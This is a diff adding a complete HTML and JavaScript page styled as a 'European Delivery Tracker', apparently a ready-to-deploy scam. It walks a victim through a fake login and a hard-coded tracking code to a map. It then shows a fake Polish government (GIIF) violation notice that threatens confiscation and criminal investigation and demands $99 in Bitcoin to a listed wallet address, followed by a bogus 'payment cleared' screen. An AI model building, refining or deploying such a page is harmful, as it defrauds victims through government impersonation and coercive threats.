@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>European Delivery Tracker</title>
+  <link rel="manifest" href="manifest.json">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #f4faff 0%, #e6eeff 100%);
+      text-align: center;
+      padding: 0;
+      margin: 0;
+      min-height: 100vh;
+    }
+    header {
+      background: #fff;
+      padding: 16px 0;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .poland-flag {
+      width: 52px;
+      vertical-align: middle;
+      margin-right: 12px;
+      border-radius: 6px;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 0;
+    }
+    main {
+      margin: 0 auto;
+      max-width: 680px;
+      padding: 24px 16px;
+      background: #fff;
+      border-radius: 18px;
+      margin-top: 32px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.07);
+    }
+    #loading, #login, #delivery, #mapSection, #errorMsg, #paymentPrompt, #confirmation {
+      display: none;
+    }
+    #mapFrame {
+      width: 100%;
+      max-width: 650px;
+      height: 420px;
+      border: 2px solid #333;
+      margin-top: 20px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.10);
+    }
+    .blinking {
+      animation: blink 1s infinite;
+      color: #e60c0c;
+      font-weight: bold;
+    }
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0; }
+      100% { opacity: 1; }
+    }
+    input[type="file"], input[type="text"], input[type="password"], button {
+      margin-top: 10px;
+      font-size: 1rem;
+      border-radius: 7px;
+    }
+    input[type="text"], input[type="password"] {
+      padding: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+      width: 90%;
+      max-width: 350px;
+    }
+    button {
+      background: #e6eeff;
+      border: 1px solid #333;
+      color: #333;
+      padding: 8px 20px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #d4e3fa;
+    }
+    .install-banner {
+      background: #e5e5ff;
+      border: 1px solid #6666cc;
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+    .install-banner button {
+      background: #fff;
+      border: 1px solid #333;
+      color: #333;
+      padding: 5px 12px;
+      border-radius: 6px;
+      margin-left: 15px;
+      cursor: pointer;
+    }
+    .danger {
+      color: #b90000;
+      font-weight: bold;
+      font-size: 1.07rem;
+    }
+    .satellite-label {
+      background: #2b2b2b;
+      color: #fafafa;
+      display: inline-block;
+      padding: 3px 14px;
+      border-radius: 16px;
+      font-size: 0.92rem;
+      margin-top: 6px;
+      margin-bottom: 2px;
+      letter-spacing: 1px;
+    }
+    .success {
+      color: #0b8000;
+      font-weight: bold;
+      font-size: 1.07rem;
+    }
+  </style>
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/1/12/Flag_of_Poland.svg">
+</head>
+<body>
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Flag_of_Poland.svg" class="poland-flag" alt="Poland Flag"/>
+    <h1>🇪🇺 European Delivery Tracker</h1>
+  </header>
+
+  <div class="install-banner" id="installBanner">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Flag_of_Poland.svg" class="poland-flag" alt="Poland Flag"/>
+    <span>Add European Delivery Tracker to your Home Screen for easy access!</span>
+    <button id="installBtn">Install</button>
+  </div>
+
+  <main>
+    <div id="loading">
+      <p>Loading secure delivery portal...</p>
+    </div>
+
+    <!-- Step 1: Login -->
+    <div id="login">
+      <h2>Secure Login</h2>
+      <form id="loginForm" autocomplete="off" onsubmit="event.preventDefault(); verifyLogin();">
+        <input type="text" id="username" placeholder="Username" required /><br>
+        <input type="password" id="password" placeholder="Password" required /><br>
+        <button type="submit">Login</button>
+      </form>
+      <p style="font-size:0.96rem;color:#888;margin-top:8px;">All activity monitored by Poland Government for your safety.</p>
+    </div>
+
+    <!-- Step 2: Tracking Code -->
+    <div id="delivery">
+      <h2>Track Your Delivery</h2>
+      <form id="trackForm" autocomplete="off" onsubmit="event.preventDefault(); promptTracking();">
+        <input type="text" id="trackingCode" placeholder="Enter your tracking code" required /><br>
+        <button type="submit">Track My Funds Delivery</button>
+      </form>
+      <p style="font-size:0.93rem;color:#555;margin-top:5px;">Safety assured. Funds protected by Polish Government.</p>
+    </div>
+
+    <!-- Error Handling -->
+    <div id="errorMsg">
+      <p id="errorText" class="danger"></p>
+    </div>
+
+    <!-- Step 3: Map -->
+    <div id="mapSection">
+      <h3>🌍 Tracking Vehicle on Map</h3>
+      <span class="satellite-label">Satellite View</span><br>
+      <iframe id="mapFrame"
+        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d2307.945763152267!2d23.33589291579728!3d54.17695657528156!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x46e0c1cf88d5e299%3A0x8f1e7f11a94bc8e!2sPrzejma%20Wysoka%2013%2C%2016-411%20Szypliszki%2C%20Poland!5e1!3m2!1sen!2spl!4v1692816657420!5m2!1sen!2spl"
+        allowfullscreen loading="lazy"></iframe>
+      <p id="carStatus">🚗 Vehicle is moving from European Central Hub to Poland, under government supervision...</p>
+    </div>
+
+    <!-- Step 4: Payment -->
+    <div id="paymentPrompt">
+      <h3 class="danger">⚠️ URGENT GOVERNMENT VIOLATION NOTICE ⚠️</h3>
+      <p class="danger">
+        <strong>Payment Required: $99 (BTC)</strong><br>
+        <span style="font-size:0.98rem;">
+          Your transaction <span style="color:#333;font-weight:bold;">1,402,492 PLN</span> is under Polish Government monitoring.<br>
+          <span style="text-decoration:underline;color:#b90000;">Immediate action required!</span><br>
+          <br>
+          <strong>Legal Violation:</strong> Polish law mandates GIIF reporting for funds above PLN 50,000.<br>
+          <span style="color:#b90000;">Non-compliance may result in immediate <u>confiscation</u>, <u>criminal investigation</u>, and <u>permanent funds freeze</u> by the Ministry of Finance and GIIF.</span><br>
+          <br>
+          To clear this and release your funds, pay <b>$99 in BTC</b> to the official GIIF address below <u>without delay</u>:
+        </span>
+      </p>
+      <p>
+        <strong>BTC Wallet Address:</strong><br>
+        <code style="font-size:1.08rem; background:#f3f3f3; padding:6px 14px; border-radius:8px;">bc1qas3rhc2hm2puwf0muz3u2wwhtl6hu0lcyqk24n</code>
+      </p>
+      <p style="color:#333;">
+        <em>
+          After payment, upload a screenshot of your BTC transaction for immediate clearance.<br>
+          <span style="color:#0b8000;font-weight:bold;">Government Safety Assured:</span> Your funds are protected and will be released upon clearance.
+        </em>
+      </p>
+      <p>
+        <strong>Receiver Address:</strong><br>
+        Przejma Wysoka 13, 16-411 Szypliszki, Poland
+      </p>
+      <p>
+        <strong>Delivery Amount:</strong> 1,402,492 PLN
+      </p>
+      <p class="blinking">📍 Current vehicle location: <span style="color:#b90000;">BLINKING RED</span></p>
+      <p><strong>Upload screenshot of BTC payment to continue tracking:</strong></p>
+      <input type="file" accept="image/*" onchange="confirmDelivery()" />
+    </div>
+
+    <!-- Step 5: Confirmation -->
+    <div id="confirmation">
+      <h2 class="success">✅ Payment Received & Cleared</h2>
+      <p>
+        <span class="success">Your $99 BTC payment has been acknowledged by the Polish Government GIIF.</span><br>
+        All legal concerns are now cleared.<br>
+        <b>Funds safety and delivery guaranteed.</b>
+      </p>
+      <p>
+        🚚 Delivery in progress to: <b>Przejma Wysoka 13, 16-411 Szypliszki, Poland</b>
+      </p>
+      <img id="uploadedImage" src="" alt="Payment Screenshot" style="max-width: 100%; margin-top: 20px; border-radius:12px; box-shadow:0 2px 6px rgba(0,0,0,0.09);" />
+      <p style="margin-top:16px;color:#555;">Thank you for your urgent compliance.<br>All funds are now assured and protected under Polish law.</p>
+    </div>
+  </main>
+
+  <script>
+    // Progressive Web App install banner
+    let deferredPrompt;
+    window.addEventListener('beforeinstallprompt', (e) => {
+      e.preventDefault();
+      deferredPrompt = e;
+      document.getElementById('installBanner').style.display = 'flex';
+    });
+    document.getElementById('installBtn').addEventListener('click', async () => {
+      if (deferredPrompt) {
+        deferredPrompt.prompt();
+        const choiceResult = await deferredPrompt.userChoice;
+        if (choiceResult.outcome === 'accepted') {
+          document.getElementById('installBanner').style.display = 'none';
+        }
+        deferredPrompt = null;
+      }
+    });
+
+    let attempts = 0;
+    const maxAttempts = 5;
+
+    // Initial load: show loading then login
+    window.onload = () => {
+      document.getElementById("loading").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("login").style.display = "block";
+      }, 1200);
+
+      // Register service worker for PWA
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', () => {
+          navigator.serviceWorker.register('sw.js')
+            .then(registration => {})
+            .catch(err => {});
+        });
+      }
+    };
+
+    // Step 1: Login process (dummy but realistic)
+    function verifyLogin() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value;
+
+      // Basic check (simulate real system)
+      if (username.length < 3 || password.length < 5) {
+        showError("Login failed. Please enter valid credentials.");
+        return;
+      }
+      // Simulate auth delay
+      document.getElementById("login").style.display = "none";
+      document.getElementById("loading").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("delivery").style.display = "block";
+      }, 900);
+    }
+
+    // Step 2: Tracking code
+    function promptTracking() {
+      const trackingInput = document.getElementById("trackingCode").value.trim();
+      if (trackingInput === "8852074") {
+        document.getElementById("delivery").style.display = "none";
+        document.getElementById("mapSection").style.display = "block";
+        // Simulate vehicle moving, after delay show payment
+        setTimeout(() => {
+          document.getElementById("carStatus").innerText =
+            "🚗 Vehicle has entered Polish territory (satellite monitoring). Immediate legal action required for GIIF clearance.";
+          document.getElementById("paymentPrompt").style.display = "block";
+        }, 4500); // 4.5 seconds for demo (was 2 hours)
+      } else {
+        attempts++;
+        document.getElementById("delivery").style.display = "none";
+        document.getElementById("errorMsg").style.display = "block";
+        if (attempts < maxAttempts) {
+          document.getElementById("errorText").innerText =
+            `❌ Tracking code not recognized. You have ${maxAttempts - attempts} chance(s) left.`;
+          setTimeout(() => {
+            document.getElementById("errorMsg").style.display = "none";
+            document.getElementById("delivery").style.display = "block";
+          }, 2600);
+        } else {
+          document.getElementById("errorText").innerText =
+            `🚫 Too many failed attempts. Locked for 1 hour.`;
+          setTimeout(() => {
+            attempts = 0;
+            document.getElementById("errorMsg").style.display = "none";
+            document.getElementById("delivery").style.display = "block";
+          }, 3600000); // 1 hour lock
+        }
+      }
+    }
+
+    function showError(msg) {
+      document.getElementById("login").style.display = "none";
+      document.getElementById("errorMsg").style.display = "block";
+      document.getElementById("errorText").innerText = msg;
+      setTimeout(() => {
+        document.getElementById("errorMsg").style.display = "none";
+        document.getElementById("login").style.display = "block";
+      }, 2200);
+    }
+
+    // Step 4: Payment confirmation
+    function confirmDelivery() {
+      const fileInput = event.target;
+      if (!fileInput.files || !fileInput.files[0]) return;
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        document.getElementById("uploadedImage").src = e.target.result;
+        document.getElementById("paymentPrompt").style.display = "none";
+        document.getElementById("confirmation").style.display = "block";
+      };
+      reader.readAsDataURL(fileInput.files[0]);
+    }
+  </script>
+</body>
+</html>
